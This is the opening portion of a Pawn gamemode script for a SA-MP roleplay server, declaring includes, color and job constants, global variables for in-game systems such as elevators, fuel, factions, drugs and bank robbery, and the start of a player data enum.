// ------------------------------------------------------------  [ International Roleplay ] ------------------------------------------------------------
// » This script was edited by Dean Hamilton(Zamora).
// » Thanks to iRage for creating zGaming Roleplay (Yes, It's a zGaming EDIT).
// ------------------------------------------------------------ [ Version ] ------------------------------------------------------------
#define SERVER_GM_TEXT "I:RP v1.1a"

#if !defined isnull
	#define isnull(%1) \
				((!(%1[0])) || (((%1[0]) == '\1') && (!(%1[1]))))
#endif

// ------------------------------------------------------------ [Includes] ------------------------------------------------------------
#include <a_samp>
#include <a_players>
#include <dini>
#include <dudb>
#include <dutils>
#include <foreach>
#include <sscanf2>
#include <irp>
#include <streamer>
#include <OPSP>
#include <progress>
#include <IRP/gvc>
#include <IRP/server>
#include <FCNPC>
#include <geolocation>
#include <mSelection>
// ------------------------------------------------------------ [ End Of Includes] ------------------------------------------------------------
// ------------------------------------------------------------ [ Constants ] -------------------------------------------------------------------
native WP_Hash(_buffer[], len, const str[]);
#pragma unused ret_memcpy
#pragma tabsize 0
#pragma dynamic 140000

static FloorNames[21][] =
{
	"Ground Floor",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"FBI Headquarter",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"Not Used",
	"FBI Roof"
};
//weapon holster
static armedbody_pTick[MAX_PLAYERS];
// Elevator Floors
static Float:FloorZOffsets[21] =
{
    0.0,		// 0.0,
    8.5479,		// 8.5479,
    13.99945,   // 8.5479 + (5.45155 * 1.0),
    19.45100,   // 8.5479 + (5.45155 * 2.0),
    24.90255,   // 8.5479 + (5.45155 * 3.0),
    30.35410,   // 8.5479 + (5.45155 * 4.0),
    35.80565,   // 8.5479 + (5.45155 * 5.0),
    41.25720,   // 8.5479 + (5.45155 * 6.0),
    46.70875,   // 8.5479 + (5.45155 * 7.0),
    52.16030,   // 8.5479 + (5.45155 * 8.0),
    57.61185,   // 8.5479 + (5.45155 * 9.0),
    63.06340,   // 8.5479 + (5.45155 * 10.0),
    68.51495,   // 8.5479 + (5.45155 * 11.0),
    73.96650,   // 8.5479 + (5.45155 * 12.0),
    79.41805,   // 8.5479 + (5.45155 * 13.0),
    84.86960,   // 8.5479 + (5.45155 * 14.0),
    90.32115,   // 8.5479 + (5.45155 * 15.0),
    95.77270,   // 8.5479 + (5.45155 * 16.0),
    101.22425,  // 8.5479 + (5.45155 * 17.0),
    106.67580,	// 8.5479 + (5.45155 * 18.0),
    112.12735	// 8.5479 + (5.45155 * 19.0)
};
// ------------------------------------------------------------ [ End Of Constants ] -------------------------------------------------------------
// ------------------------------------------------------------ [ Server Defines ] ------------------------------------------------------------
#define SpeedCheck(%0,%1,%2,%3,%4) floatround(floatsqroot(%4?(%0*%0+%1*%1+%2*%2):(%0*%0+%1*%1) ) *%3*1.6)
#define ANTIHACK "MOLE"
// Death System
#define AFTERLIFE_SECONDS 300 // 5 Minutes
#define AUTODEATH_SECONDS 300 // 5 minutes
new Float:DeathPosX					[MAX_PLAYERS];
new Float:DeathPosY					[MAX_PLAYERS];
new Float:DeathPosZ					[MAX_PLAYERS];
new IsDead							[MAX_PLAYERS];
new SecsToGo						[MAX_PLAYERS];
new IsAfterLifing					[MAX_PLAYERS];
// Speed & Fuel
new Text:FuelText[MAX_PLAYERS];
new Text:SpeedText[MAX_PLAYERS];
//Island
new Bag;
new Ship;
new Ship1;
new Shark;
//helicamera
new objectids[MAX_VEHICLES];
new Text:crosshair[MAX_PLAYERS];
new playerveh[MAX_PLAYERS];
//end of heli camera
new AfterLifeTimer;
new jihadtimer;
new jihad1timer;
// New speed radar
new VehRadarID [MAX_VEHICLES];
new Text: RadarHud;
new Text: SpeedAndModel [MAX_VEHICLES];
new CheckingSpeed [MAX_VEHICLES];
new OldVehID [MAX_PLAYERS];
forward UpdateSpeed (vehid);
forward CheckValidTextDraws();
//helicamerea
forward THERMALON( playerid, veh );
forward THERMALOFF(playerid);
//end of heli camera
new VehicleModel[212][] ={
"Landstalker", "Bravura", "Buffalo", "Linerunner", "Perrenial","Sentinel", "Dumper", "Firetruck", "Trashmaster", "Stretch", "Manana",
"Infernus", "Voodoo", "Pony", "Mule", "Cheetah", "Ambulance","Leviathan", "Moonbeam", "Esperanto", "Taxi",
"Washington", "Bobcat","Whoopee", "BF Injection", "Hunter", "Premier","Enforcer", "Securicar", "Banshee",
"Predator", "Bus", "Rhino", "Barracks", "Hotknife","Trailer 1", "Previon", "Coach", "Cabbie", "Stallion",
"Rumpo", "RC Bandit", "Romero", "Packer","Monster", "Admiral", "Squalo","Seasparrow", "Pizzaboy", "Tram", "Trailer 2",
"Turismo", "Speeder", "Reefer", "Tropic","Flatbed", "Yankee", "Caddy", "Solair","Berkley's RC Van", "Skimmer", "PCJ-600", "Faggio",
"Freeway", "RC Baron", "RC Raider","Glendale", "Oceanic", "Sanchez", "Sparrow","Patriot", "Quad", "Coastguard", "Dinghy", "Hermes",
"Sabre", "Rustler", "ZR-350","Walton", "Regina", "Comet", "BMX", "Burrito","Camper", "Marquis", "Baggage", "Dozer", "Maverick",
"News Chopper", "Rancher","FBI Rancher", "Virgo", "Greenwood", "Jetmax", "Hotring","Sandking", "Blista Compact", "Police Maverick",
"Boxvillde", "Benson","Mesa", "RC Goblin", "Hotring Racer A", "Hotring Racer B","Bloodring Banger", "Rancher", "Super GT", "Elegant",
"Journey", "Bike", "Mountain Bike", "Beagle", "Cropduster","Stunt",  "Tanker", "Roadtrain", "Nebula", "Majestic", "Buccaneer",
"Shamal", "Hydra","FCR-900", "NRG-500", "HPV1000", "Cement Truck", "Tow Truck", "Fortune","Cadrona", "FBI Truck", "Willard",
"Forklift", "Tractor", "Combine","Feltzer", "Remington", "Slamvan", "Blade", "Freight","Streak","Vortex", "Vincent", "Bullet",
"Clover", "Sadler", "Firetruck LA","Hustler", "Intruder", "Primo", "Cargobob", "Tampa","Sunrise", "Merit","Utility", "Nevada",
"Yosemite", "Windsor", "Monster A", "Monster B", "Uranus", "Jester", "Sultan","Stratum", "Elegy", "Raindance","RC Tiger",
"Flash", "Tahoma", "Savanna", "Bandito","Freight Flat", "Streak Carriage", "Kart","Mower", "Dune", "Sweeper", "Broadway",
"Tornado", "AT-400", "DFT-30", "Huntley", "Stafford","BF-400", "News Van", "Tug", "Trailer 3", "Emperor","Wayfarer", "Euros",
"Hotdog","Club", "Freight Carriage", "Trailer 4","Andromada", "Dodo", "RC Cam", "Launch", "Police Car (LSPD)","Police Car (SFPD)",
"Police Car (LVPD)", "Police Ranger", "Picador", "S.W.A.T", "Alpha","Phoenix", "Glendale", "Sadler", "Luggage Trailer A",
"Luggage Trailer B", "Stairs", "Boxville", "Tiller", "Utility Trailer" };
// relog system
new bool: isRelogging[MAX_PLAYERS], relogPlayerIP[MAX_PLAYERS][17];
//mapping shit more
new oEdit[MAX_PLAYERS];
new oEditID[MAX_PLAYERS]; // Object's ID
new Float:oPos[MAX_PLAYERS][3];
new Float:oRot[MAX_PLAYERS][3];
new oldoID;
// Duty System
new aDuty[MAX_PLAYERS];
// New Skin Shits
new skinlist = mS_INVALID_LISTID;
new toys = mS_INVALID_LISTID;
//TEXTDRAS AGENCY
new Float:dX, Float:dY, Float:dZ, Float:dRX, Float:dRY, Float:dRZ;
//WEAPON HOLSTER
new OldWeapon[MAX_PLAYERS];
new HoldingWeapon[MAX_PLAYERS];
/*Graffiti System
f CreateGraffiti(playerid);
forward StartDrawing(playerid);
forward UpdateKey(playerid);
forward GraffitiDone(playerid);
forward GraffitiFailed(playerid);
forward DeleteObject(playerid);
forward ResetVariables(playerid);*/
//DEATH
forward AfterLife(playerid);
forward AutoDeath(playerid);
forward Speedometer(playerid);
//Jihad
forward jihad(playerid);
forward jihad1(playerid);
// Marker Colors
#define TRANSPARENT_WHITE 0xFFFFFF00
#define TRANSPARENT_GREY 0xAFAFAF00
#define TRANSPARENT_BLUE 0x2641FE00
#define TRANSPARENT_ORANGE 0xFF990000
#define TRANSPARENT_PURPLE 0xC2A2DA00
#define TRANSPARENT_VIP 0xC93CCE00
// WEAPON HOLSTER
#define ARMEDBODY_USE_HEAVY_WEAPON                      (false)
// FBI Elevator
#define X_DOOR_CLOSED       (1786.627685)
#define X_DOOR_R_OPENED     (1785.027685)
#define X_DOOR_L_OPENED     (1788.227685)
#define GROUND_Z_COORD      (14.511476)
#define ELEVATOR_OFFSET     (0.059523)
#define ELEVATOR_STATE_IDLE     (0)
#define ELEVATOR_STATE_WAITING  (1)
#define ELEVATOR_STATE_MOVING   (2)
#define INVALID_FLOOR           (-1)
#define DIALOG_ID           (874)
#define ELEVATOR_SPEED      (5.0)   // Movement speed of the elevator.
#define DOORS_SPEED         (4.0)   // Movement speed of the doors.
#define ELEVATOR_WAIT_TIME  (5000)  // Time in ms that the elevator will wait in each floor before continuing with the queue.
// Colors
#define COLOR_GREY                         0xAFAFAFAA
#define COLOR_PALEGREEN 0x58FAACFF
#define COLOR_LIGHTLGREEN 0x298A08FF
#define COLOR_LIGHTSALMON 0xFF9966FF
#define COLOR_ADMCHAT 0xFF0000FF
#define COLOR_SCRIPTER 0xFA58ACFF
#define COLOR_ADMWARN 0xFF8000FF
#define COLOR_SWARN 0xFE2EC8FF
#define COLOR_WHITE 0xFFFFFFFF
#define COLOR_FADE1 0xE6E6E6E6
#define COLOR_FADE2 0xC8C8C8C8
#define COLOR_FADE3 0xAAAAAAAA
#define COLOR_FADE4 0x8C8C8C8C
#define COLOR_FADE5 0x6E6E6E6E
#define COLOR_OOC 0xE0FFFFFF
#define COLOR_LIGHTRED 0xFF6347FF
#define COLOR_DARKRED 0xAA3333FF
#define COLOR_RED 0xFF0606FF
#define	FIND_COLOR 0xB90000FF
#define COLOR_CHIGS 0xBFFF00FF
#define COLOR_LIGHTBLUE 0x33CCFFFF
#define COLOR_GREEN 0x33AA33FF
#define COLOR_INT 0x01A9DBFF
#define COLOR_YELLOW 0xFFFF00FF
#define COLOR_PURPLE 0xC2A2DAFF
#define COLOR_ORANGE 0xFF9900FF
#define COLOR_REPORT 0xFFFF91FF
#define COLOR_RADIO 0x8D8DFFFF
#define COLOR_DEPTRADIO 0xFFD700FF
#define COLOR_BLUE 0x2641FEFF
#define COLOR_PINK 0xFF66FFFF
#define COLOR_GOV 0xB40404FF
#define COLOR_MEDIC 0xFF8282FF
#define COLOR_DOC 0x9ACD32FF
#define COLOR_NEWBIE 0x7DAEFFFF
#define COLOR_LIME 0x00FF00FF
#define COLOR_NEWS 0x049C71FF
#define COLOR_CYAN 0x01FCFFFF
#define COLOR_VIP 0xC93CCEFF
#define COLOR_FBI 0x2E9AFEFF
// Map Markers
#define MARKER_LIGHTBLUE 0x33CCFFFF
// WALK STYLE
#define WALK_DEFAULT (0)
#define WALK_NORMAL (1)
#define WALK_PED (2)
#define WALK_GANGSTA (3)
#define WALK_GANGSTA2 (4)
#define WALK_OLD (5)
#define WALK_FAT_OLD (6)
#define WALK_FAT (7)
#define WALK_LADY (8)
#define WALK_LADY2 (9)
#define WALK_WHORE (10)
#define WALK_WHORE2 (11)
#define WALK_DRUNK (12)
#define WALK_BLIND (13)
// New MDC
#define	MDC_START_ID (10098)
#define	MDC_MAIN (10099)
#define	MDC_FIND (10100)
#define	MDC_BACKUP (10101)
#define	MDC_FINDCIV (10102)
#define MDC_CIVILIAN (10103)
#define	MDC_CHECK (10104)
#define	MDC_RECORD (10103)
#define	MDC_VEHICLE (10105)

// Custom Defines
#define MAX_FACTIONS 8
#define MAX_FAMILIES 15 // 1 to 6, ignore 0
#define MAX_BIZ 501 // Ignore 0
#define MAX_HOUSES 1001 // Ignore 0
#define MAX_GARAGES 101 //Ignore 0
#define MAX_DOORS 600
#define MAX_MAPICONS 300
#define MAX_MUSIC 3
#define MAX_ADS 501
#define MAX_CUSTOM_VEHICLES 5001
#define MAX_SPIKESTRIPS 200
#define MAX_CONES 300
#define MAX_GATES 500 // Ignore 0
#define MAX_COBJECTS 50000
#define SPECIAL_ACTION_PISSING 68
#define MAX_POINTS 8

//boombox
#define DIALOG_BOOMBOX  500
#define DIALOG_BOOMBOX1 501
#define DIALOG_BOOMBOX2 502
#define DIALOG_HELP 503
#define DIALOG_HELP2 504
// Advertisements
#define TIMER_AD 60

// Job Defines
#define MAX_JOBS 11
#define JOB_NONE 0
#define JOB_LAWYER 1
#define JOB_FISHER 2
#define JOB_WDEALER 3
#define JOB_WSMUGGLER 4
#define JOB_DDEALER 5
#define JOB_DSMUGGLER 6
#define JOB_MECHANIC 7
#define JOB_TRUCKER 8
#define JOB_BODYGUARD 9
#define JOB_CARJACKER 10
// -------------------------------------------------------------- [ End Of Defines ] ---------------------------------------------------------------
// -------------------------------------------------------------- [ Variables ] ---------------------------------------------------------------
new walktime[MAX_PLAYERS];
// Job
new GettingJob[MAX_PLAYERS];
// MDC
new ConnectedToPC[MAX_PLAYERS];
new FindTimePoints[MAX_PLAYERS];
new FindingPlayer[MAX_PLAYERS];
new FindTime[MAX_PLAYERS];
new UsedFind[MAX_PLAYERS];
//boombox new's
new gPlayerLoggin[MAX_PLAYERS char];


// New Admin Tag
//new Text3D:aAdminText[MAX_PLAYERS];
// Weather
new GlobalWeather;
// FBI Elevator
new Obj_Elevator, Obj_ElevatorDoors[2], Obj_FloorDoors[21][2];
new ElevatorState,
	ElevatorFloor;  // If Idle or Waiting, this is the current floor. If Moving, the floor it's moving to.
new ElevatorQueue[21],  	// Floors in queue.
    FloorRequestedBy[21];   // FloorRequestedBy[floor_id] = playerid; - Points out who requested which floor.
new ElevatorBoostTimer;     // Timer that makes the elevator move faster after players start surfing the object.
/*Graffiti System
new Float:GraffitiPos[MAX_PLAYERS][6];
new GraffitiObject[MAX_PLAYERS];
new ShowFont[MAX_PLAYERS];
new GraffitiText[MAX_PLAYERS][128];
new GraffitiColor[MAX_PLAYERS][32];
new GraffitiFont[MAX_PLAYERS][16];
new GraffitiSize[MAX_PLAYERS];
new Color[24];
new Font[16];
new PlayerText:ClickTD[MAX_PLAYERS];
new UpdateTimer[MAX_PLAYERS];
new DeleteObjectTimer[MAX_PLAYERS];
new KeyForPress[MAX_PLAYERS];
new ColorNow[MAX_PLAYERS];
new CountTimer[MAX_PLAYERS];
new KeyPressed[MAX_PLAYERS];*/
// Vote System
new VoteYES;
new VoteNO;
new VoteStarted;
new VoteQuestion[128];
new HasVoted[MAX_PLAYERS];
//special days
new DayUnbreakable;
new DayPaycheck;
new DayNoShops;
new DayZeroGravity;
new DayRespect;
// Paycheck TextDraws
new Text:Paycheck0;
new Text:Paycheck1;
new Text:Paycheck2;
new Text:Paycheck3;
//MainMenu TextDraw
new Text:MainMenuTxtdraw[12];
new Text:TS3Draw;
new Text:ForumDraw;
new Text:MOTDraw;
new Text:MOTDDraw;
new Text:SPDNDraw;
new Text:SPDNDDraw;
new Text:UpdatesTD;
new Text:UpdatesTD1;
// Admin Fly
new	bool:flying[MAX_PLAYERS];
//cellphone
new LastSMS[MAX_PLAYERS];
new txtcost = 2;
new SpeakerPhone[MAX_PLAYERS];
new Mobile[MAX_PLAYERS];
new CellTime[MAX_PLAYERS];
new CalledMedics[MAX_PLAYERS];
new MedicsCallTime[MAX_PLAYERS];
new CalledCops[MAX_PLAYERS];
new CopsCallTime[MAX_PLAYERS];
enum pCrime
{
	pBplayer[32],
	pAccusing[32],
	pAccusedof[32],
	pVictim[32],
};
new PlayerCrime[MAX_PLAYERS][pCrime];
//New detain
new OneSeatVehicles[38] =
{
    425, 430, 432, 441, 446, 448, 452, 453,
	454, 464, 465, 472, 473, 476, 481, 484,
	485, 486, 493, 501, 509, 510, 519, 520,
	530, 531, 532, 539, 553, 564, 568, 571,
	572, 574, 583, 592, 594, 595
};
// Hospital Time
new Text:HospitalText;


// level system
new levelcost = 2000; //level cost
new levelexp = 4; //levelexp


// Gates
// gedit: object - closed - opened - speed - password
new gEdit[MAX_PLAYERS]; // 1 = closed | 2 = opened
new gEditID[MAX_PLAYERS]; // Object's ID
new Float:gPos[MAX_PLAYERS][3];
new Float:gRot[MAX_PLAYERS][3];

// News
new NewsMoney;

// Refunding
new Refund[MAX_PLAYERS];

// Toys
new toyslot[MAX_PLAYERS];

// Famed Points
new FHealth;
new FFix;
new FRefill;

// Stoned Timer
new StonedTimer[MAX_PLAYERS];


//Pickups
new DOCPickup;
new BUYPickup;
new WithdrawPickup;
new DepositPickup;
new VIPPickup;
new CityHallPickup;
new GymPickup;
new DrugPickup;
new cocainePickup;
new FactoryPickup;
new DMVPickup;
new SaintsPickup;
new BankPickup;

// Fishes
new Fished[MAX_PLAYERS];
new FishTime[MAX_PLAYERS];

// Falseban fix
new FalseBan[MAX_PLAYERS];

// Bank Robbery
new BankRobbery;
new BankRobbersCount;
new BankRobbers[5][MAX_PLAYER_NAME];
new BankRobber[MAX_PLAYERS];
new RobberyRequest[MAX_PLAYERS];
new RobberyStarted;
new DeliverMoney[MAX_PLAYERS];
new BankRobberyTime;
// News
new LiveBy[MAX_PLAYERS];
new LiveRequest[MAX_PLAYERS];
new Live[MAX_PLAYERS];
new LiveConference;

// Family skins
new pskin[MAX_PLAYERS], fskin[MAX_PLAYERS];


// Join Messages
new JoinMessages[MAX_PLAYERS];

// GMX
new GMX[MAX_PLAYERS];

// Spikes
enum sInfo
{
	sCreated,
    Float:sX,
    Float:sY,
    Float:sZ,
    sObject,
};
new SpikeInfo[MAX_SPIKESTRIPS][sInfo];
//Cones
enum cInfo
{
		cCreated,
		Float:cX,
	    Float:cY,
	    Float:cZ,
	    cObject,
};
new ConeInfo[MAX_CONES][cInfo];

// Sirens
new Siren[MAX_VEHICLES];
new SirenObject[MAX_VEHICLES];

// Truck Packages
new TruckPackages[MAX_VEHICLES];

// Fuel
new Fuel[MAX_VEHICLES];
new FuelVar[MAX_VEHICLES];
new fMeter[MAX_PLAYERS];
new Refill[MAX_PLAYERS];

// Family Vehicles
new Fam[MAX_VEHICLES];


// VIP Tag
new VIPTag[MAX_PLAYERS];
new Text3D:VIPText[MAX_PLAYERS];
// VIP Dialog
new VIP[MAX_PLAYERS];
// VIP Cars
new VIPCar[29];
//  Name Change
new VIPName[MAX_PLAYERS][MAX_PLAYER_NAME];
new Approve[MAX_PLAYERS];
new PlayerName[MAX_PLAYERS][MAX_PLAYER_NAME];

// Dragging
new Drag[MAX_PLAYERS];
new Dragged[MAX_PLAYERS];

// Anti CS
#define MAX_SLOTS 48
new NotMoving[MAX_PLAYERS];
new WeaponID[MAX_PLAYERS];
new CheckCrouch[MAX_PLAYERS];
new Ammo[MAX_PLAYERS][MAX_SLOTS];



// AntiAFK
new AFK[MAX_PLAYERS];
new Float:OldPos[MAX_PLAYERS][3];
new Float:NewPos[MAX_PLAYERS][3];
new IsAFK[MAX_PLAYERS];
new Text3D:AFKText[MAX_PLAYERS];

// Families Safe & HQ System
new Float:FamSafeX[MAX_PLAYERS];
new Float:FamSafeY[MAX_PLAYERS];
new Float:FamSafeZ[MAX_PLAYERS];
new Float:FamHQX[MAX_PLAYERS];
new Float:FamHQY[MAX_PLAYERS];
new Float:FamHQZ[MAX_PLAYERS];
//Trunk
new topened[MAX_PLAYERS];
// Paintball
new paintballdeath[MAX_PLAYERS];
new Paintball[MAX_PLAYERS];
new PaintballPlayers;
new PaintballOn;
new PaintballWep[2];

// Event
new Float:ePos[3];
new eInt, eVW;
new eventdeath[MAX_PLAYERS];
new Float:eX, Float:eY, Float:eZ;
new Float:eHP, Float:eARMOR;
new Event[MAX_PLAYERS];
new EventOn;
new EventLocked;
new EventWep[3];
new Float:EventHealth;
new Float:EventArmor;
new EventType;
new EventTeam[MAX_PLAYERS];

// Handshake
new ShakeHandRequest[MAX_PLAYERS];
new ShakeHandStyle[MAX_PLAYERS];

// Chat
new Chat[MAX_PLAYERS];

// DMV
new DMVCar[5];
new LicenseTest[MAX_PLAYERS];
new CP[MAX_PLAYERS];
// Listening
new Whispers[MAX_PLAYERS];
new SMSes[MAX_PLAYERS];
new PMs[MAX_PLAYERS];
new ICchat[MAX_PLAYERS];


// Alt-Tab Detection
new AltTabbed[MAX_PLAYERS];
new Tabbed[MAX_PLAYERS];
new Text3D:AltTabText[MAX_PLAYERS];
new HasText[MAX_PLAYERS];
/*// House Interiors
new Interior1[26];
new Interior2[34];
new Interior3[33];
new Interior4[62];
new Interior5[54];
new Interior6[63];*/
// AntiTP
new AntiTP[MAX_PLAYERS];
new AntiTPTimer[MAX_PLAYERS];
// Points
new Capturer = -1;
new CapturerFam = -1;
// Paycheck
new PayChecks;

// HH Check
new HHcheckUsed = 0;
new Float:HHcheckFloats[MAX_PLAYERS][6];
new HHcheckInt[MAX_PLAYERS];
new HHcheckVW[MAX_PLAYERS];

// MOTDS
new ADMINMOTD[128];
new SMOTD[128];
new LSPDMOTD[128];
new GOVMOTD[128];
new HAMOTD[128];

// TUpdates
new UPDATE1[256];
new UPDATE2[256];
new UPDATE3[256];
new UPDATE4[256];
new UPDATE5[256];


// Spam
new CommandSpamCount[MAX_PLAYERS];
new OldSpamCommand[MAX_PLAYERS][128];
new NewSpamCommand[MAX_PLAYERS][128];
new ChatSpamCount[MAX_PLAYERS];
new OldSpamChat[MAX_PLAYERS][128];
new NewSpamChat[MAX_PLAYERS][128];
// Drugs
new DrugTimeout[MAX_PLAYERS];

// Admin Mark
new Float:aMark[MAX_PLAYERS][3];
new aMarkInt[MAX_PLAYERS];
new aMarkVw[MAX_PLAYERS];

//Ads
new HasAD[MAX_PLAYERS];
new AdQueue;
new AD[MAX_ADS][128];
new iAD[MAX_ADS];
new iAdName[MAX_ADS][32];
new LastAd;
// Tutorial Timers
new Tut[MAX_PLAYERS];

// Weed and cocaine
new Seed;
new Text3D:SeedsText;
new cocaine;
new Text3D:cocaineText;
// Products
new Products;
// Website
new Text:WebTD;
// Time System
new tsec,tmin,thour;
new Text:TimeTD;
new Seconds[MAX_PLAYERS];
// Togging VIP
new VIPOff[MAX_PLAYERS];
// Togging Phone
new PhoneOff[MAX_PLAYERS];
// Tickets
new TicketBy[MAX_PLAYERS];
new TicketPrice[MAX_PLAYERS][MAX_PLAYERS];

// Prison & Jail Cells
new Float:RandomJail[][4] =
{
	{-2067.7932,-188.8857,991.5363},
	{-2074.0325,-191.5839,991.5363},
	{-2079.5518,-207.5191,991.5363},
	{-2076.7668,-207.2285,991.5363},
	{-2067.1689,-206.8152,991.5363},
	{-2067.1689,-206.8152,991.5363},
	{-2067.1689,-206.8152,991.5363},
	{-2064.2771,-207.5918,991.5363},
	{-2064.2771,-207.5918,991.5363}
};
new Float:RandomPrison[][10] =
{
	{-2050.8135,-190.0087,991.5363},
	{-2057.0757,-189.6347,991.5363},
	{-2061.3667,-189.1788,991.5363},
	{-2069.0020,-188.7800,991.5363},
	{-2074.5652,-189.5683,991.5363},
	{-2080.4224,-188.8023,991.5363},
	{-2087.0930,-209.6777,991.5363},
	{-2080.1853,-210.8266,991.5363},
	{-2074.0713,-210.0562,991.5363},
	{-2068.2537,-210.1222,991.5363},
	{-2061.7761,-209.4704,991.5363},
	{-2056.4661,-209.9551,991.5363}
};
// Public variables
new Invited[MAX_PLAYERS];
new Inviter[MAX_PLAYERS];
new Faction[MAX_PLAYERS];
new fInvited[MAX_PLAYERS];
new fInviter[MAX_PLAYERS];
new Family[MAX_PLAYERS];
new Tazer[MAX_PLAYERS];
new ReplaceTazer[MAX_PLAYERS];
new Float:fPos[3];
new TazeTimeout[MAX_PLAYERS];
new TazeCountDown[MAX_PLAYERS];
new Tracking[MAX_PLAYERS];
new CuffTimeout[MAX_PLAYERS];
new CuffCountDown[MAX_PLAYERS];
new Uncuffed[MAX_PLAYERS];
new GunsBeingRemoved[MAX_PLAYERS];
new TempGuns[13];
new TempGunsAmmo[13];
new Tazed[MAX_PLAYERS];
new Cuffed[MAX_PLAYERS];
new HospitalCountDown[MAX_PLAYERS];
new Hospital[MAX_PLAYERS];
new HospitalTime[MAX_PLAYERS];
new LastCar[MAX_PLAYERS];
new Spec[MAX_PLAYERS];
new Specid[MAX_PLAYERS];
new NewbieTime[MAX_PLAYERS];
new GarageTime[MAX_PLAYERS];
new Calling[MAX_PLAYERS];
new Called[MAX_PLAYERS];
new BeingCalled[MAX_PLAYERS];
new Caller[MAX_PLAYERS];
new CallTime[MAX_PLAYERS];
new Speedo[MAX_PLAYERS];
new Tied[MAX_PLAYERS];
new Blindfolded[MAX_PLAYERS];
new OldGun[MAX_PLAYERS];
new OldAmmo[MAX_PLAYERS];
new NoSprunk[MAX_PLAYERS];
new ReportTime[MAX_PLAYERS];
new HelpTime[MAX_PLAYERS];
new Float:hPos[MAX_PLAYERS][3];
new hPOS[MAX_PLAYERS][2];
new Float:vPos[MAX_PLAYERS][3];
// Materials
new SellMaterialsTo[MAX_PLAYERS];
new BuyMaterialsFrom[MAX_PLAYERS];
new BuyMaterialsAmount[MAX_PLAYERS];
new BuyMaterialsPrice[MAX_PLAYERS];
new BeenOfferedMaterials[MAX_PLAYERS];
new sellgunmedmats[MAX_PLAYERS];
new sellgunlowmats[MAX_PLAYERS];
new sellgunhighmats[MAX_PLAYERS];
// Weapons
new SellWeaponTo[MAX_PLAYERS];
new BuyWeaponFrom[MAX_PLAYERS];
new BuyWeaponPrice[MAX_PLAYERS];
new BeenOfferedWeapon[MAX_PLAYERS];
// Drugs
new WeedSeller[MAX_PLAYERS];
new WeedPrice[MAX_PLAYERS][MAX_PLAYERS];
new WeedAmount[MAX_PLAYERS][MAX_PLAYERS];
new seedSeller[MAX_PLAYERS];
new seedPrice[MAX_PLAYERS][MAX_PLAYERS];
new seedAmount[MAX_PLAYERS][MAX_PLAYERS];
new cocaineSeller[MAX_PLAYERS];
new cocainePrice[MAX_PLAYERS][MAX_PLAYERS];
new cocaineAmount[MAX_PLAYERS][MAX_PLAYERS];

// Hitman
new Hitman[MAX_PLAYERS];
// Defend and Free
new FreeBy[MAX_PLAYERS];
new FreePrice[MAX_PLAYERS][MAX_PLAYERS];
new FreeTime[MAX_PLAYERS];
new DefendBy[MAX_PLAYERS];
new DefendPrice[MAX_PLAYERS][MAX_PLAYERS];
new FreeTimeout[MAX_PLAYERS];
new DefendTimeout[MAX_PLAYERS];

// Vest
new VestPrice[MAX_PLAYERS][MAX_PLAYERS];
new VestBy[MAX_PLAYERS];


// Non-Player Variables
new LSPDLobbyStatus;
new LSPDBarrier;
new LSPDBarrierStatus;
new LSPDGate;
new LSPDGateStatus;
new OOCStatus;
new NewbieStatus = 1;
new saintsgate1;
new saintsgate2;
new SaintsGateStatus;
new SaintsGateStatus2;
new fbigate;
new docgate;
new docgatestatus;
new FBIGateStatus;
new fbidoor;
new fbidoorstatus;
new docdoor1;
new docdoor1status;
new docdoor2;
new docdoor2status;
//new cVeh[MAX_CUSTOM_VEHICLES];
new TaxMoney;
new cVeh[MAX_CUSTOM_VEHICLES];
new TaxPercent;
new TempTaxPercent;
new TaxRequester = -1;
new SafeRequester = -1;
new HQRequester = -1;
new SAGate1;
new SAGateStatus1;
new SAGate2;
new SAGateStatus2;
new vipgate;
new vipgateStatus;
//Namechange
new NameRequester = -1;
/*new vipf
new vipdoor2;*/
new lspddoor;
// Animations
new gPlayerUsingLoopingAnim[MAX_PLAYERS];
new gPlayerAnimLibsPreloaded[MAX_PLAYERS];
new animation[MAX_PLAYERS];
new Text:txtAnimHelper;
// Bars
new Bar:Download[MAX_PLAYERS];
// -------------------------------------------------------------- [ End of Variables ] ---------------------------------------------------------------
// -------------------------------------------------------------- [ Enums ] ---------------------------------------------------------------
// User settings
enum pInfo
{
	// Temp Values
	pLoggedIn,
	pSpawn,
	// Permanent Values
	pIP[16],
	pOwner,
	pLevel,
	pMinutes,
	pHours,
	pExp,
	pGender,
	pAge,
	pMoney,
	pBank,
	pModel,
	pAdmin,
	pBanned,
	pEBanned,
	Float:pX,
	Float:pY,
	Float:pZ,
	Float:pxX,
	Float:pyY,
	Float:pzZ,
	pInt,
	pVW,
	pFac,
	pFacRank,
	pFacLeader,
	pWeapon[13],
	pWeaponAmmo[13],
	pHospital,
	pFacDuty,
	pFacDiv,
	pFacDivLeader,
	pBiz,
	pVBiz,
	pHouse,
	pVHouse,
	pGarage,
	pVGarage,
	pJob,
	pJobSkill[MAX_JOBS],
	pTPackages,
	pFruitProd,
	pMatProd,
	pClothProd,
	pGasProd,
	pLMPackages,
	pMMPackages,
	pHMPackages,
	pDPackages,
	pMaterials,
	pLMaterials,
	pMMaterials,
	pHMaterials,
	pWeedObject,
	Float: pWeedPos[3],
	pWeedVW,
	pWeedInt,
	pWeedGrowth,
	pSeeds,
	pWeed,
	pCocaine,
	pHasCellphone,
	pBoombox,
	pAUXCord,
	pCDPlayer,
	pPhone,
	pPhonebook,
	pDice,
	pCigar,
	pSpeedo,
	pSprunk,
	pSpray,
	pRope,
	pBlindfold,
	pWT,
	pWTC,
	pGas,
	pRadio,
	Float:pHealth,
	Float:pArmor,
	pInternet,
	pSong[MAX_MUSIC],
	pJail,
	pJailTime,
	pJailReason[64],
	pJailBy[32],
	pPrison,
	pPrisonTime,
	pPrisonReason[64],
	pPrisonBy[32],
	pWanted,
	pWanted1[64],
	pWanted2[64],
	pWanted3[64],
	pWanted4[64],
	pWanted5[64],
	pWanted6[64],
	pCrimes,
	pArrested,
	pContract,
	pContractBy[32],
	pTutorial,
	pWarns,
	pWarn1[64],
	pWarn2[64],
	pWarn3[64],
	pFlag[65],
	pNMute,
	pRMute,
	pAdminLocked,
	pSpawnFreeze,
	pFam,
	pFamRank,
	pCSuccess,
	pCFail,
	pMask,
	pMasked,
	pHelper,
	pNWarns,
	pRWarns,
	pDead,
	pRadarGun,
	pFamed,
	pFamedPoints,
